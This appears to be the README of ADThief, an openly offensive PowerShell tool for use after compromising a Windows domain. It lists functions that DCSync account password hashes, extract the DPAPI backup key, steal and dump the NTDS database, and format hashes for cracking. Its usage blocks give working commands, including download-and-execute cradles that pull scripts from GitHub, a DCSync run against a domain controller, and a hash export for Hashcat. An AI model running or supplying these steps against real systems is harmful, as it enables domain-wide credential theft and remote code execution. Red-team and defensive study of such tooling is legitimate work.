# ADThief

ADThief is a PowerShell tool to exploit Active Directory database after compromising a Windows domain.

## Functions

```
Invoke-DCSync                   -   extracts domain accounts from Active Directory domain controller, including password hashes
Get-DpapiBackupKey              -   extracts the DPAPI backup key from Active Directory domain controller
Get-ADDatabase                  -   steals Active Directory database remotely
Dump-ADDatabase                 -   dumps domain accounts from an offline Active Directory database, including password hashes
Mount-ADDatabase                -   mounts an Active Directory database as a local LDAP server
Get-LdapObject                  -   searchs for domain objects in a mounted Active Directory database
```

## Requirements

The functions `Invoke-DCSync`, `Get-DpapiBackupKey` and `Get-ADDatabase` require a privileged access to Active Directory, typically domain admin rights.
The functions `Dump-ADDatabase` and `Mount-ADDatabase` require admin rights on the local computer.

The functions `Invoke-DCSync`, `Get-DpapiBackupKey` and `Dump-ADDatabase` must be launched on a computer with DSInternals PowerShell module installed. The output of these functions can be formatted using custom views provided by the DSInternals module to support different password cracking tools. The Utils.ps1 file contains a function `Add-DSAccountCustomViews` to add optional views 'SecretsDump' and 'SecretsDumpHistory'.

```
PS C:\> Install-Module DSInternals -Scope CurrentUser
PS C:\> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tmenochet/ADThief/master/Utils.ps1')
PS C:\> Add-DSAccountCustomViews
PS C:\> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tmenochet/ADThief/master/ADThief.ps1')
PS C:\> Invoke-DCSync -Server DC.ADATUM.CORP -Credential ADATUM\Administrator | Format-Custom -View SecretsDump
```

The function `Mount-ADDatabase` must be launched on a computer with AD LDS installed. Please make sure to back up the NTDS.DIT file before using the option 'AllowUpgrade'. 

```
PS C:\> Enable-WindowsOptionalFeature -FeatureName "DirectoryServices-ADAM-Client" -Online
PS C:\> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tmenochet/ADThief/master/ADThief.ps1')
PS C:\> Get-ADDatabase -Server DC.ADATUM.CORP -Credential ADATUM\Administrator
PS C:\> Dump-ADDatabase | Format-Custom -View HashcatNT | Out-File -Encoding ascii ADATUM.hashes
PS C:\> Mount-ADDatabase -AllowUpgrade -LdapPort 1389
PS C:\> Get-LdapObject -Server localhost:1389 -SearchBase "dc=adatum,dc=corp" -Filter "(&(userAccountControl:1.2.840.113556.1.4.803:=65536)(!userAccountControl:1.2.840.113556.1.4.803:=2))" -Properties sAMAccountName,servicePrincipalName
PS C:\> Umount-ADDatabase
```

## Credits

* https://blog.netspi.com/getting-started-wmi-weaponization-part-4/
* https://github.com/MichaelGrafnetter/DSInternals
